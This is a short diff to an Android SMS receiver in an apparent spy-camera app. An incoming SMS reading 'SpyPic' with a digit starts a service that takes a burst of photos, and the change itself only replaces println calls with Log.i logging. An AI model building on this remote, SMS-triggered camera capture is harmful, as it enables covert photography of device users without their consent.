@@ -27,7 +27,6 @@ public class SmsReceiver extends BroadcastReceiver {
                         msgBody = msgs[i].getMessageBody();
                         String intValue = msgBody.replaceAll("[^0-9]", "");
                         Log.i("SPY_CAM", "INT :" + intValue);
-                        System.out.println(intValue);
                         String originalMsg = msgBody.replaceAll("[0-9]","");
                         Log.i("SPY_CAM" , "Msg :" + originalMsg);
                         if (originalMsg.equals("SpyPic")) {
@@ -37,7 +36,7 @@ public class SmsReceiver extends BroadcastReceiver {
                                 firstValue = Character.getNumericValue(intValue.charAt(0));
                             }
                             if (firstValue != 0 && firstValue < 5) {
-                                System.out.println("FirstValue :" + firstValue);
+                                Log.i("SPY_CAM","FirstValue :" + firstValue);
                                 picServiceIntent.putExtra("burstValue", firstValue);
                             }
                             context.startService(picServiceIntent);
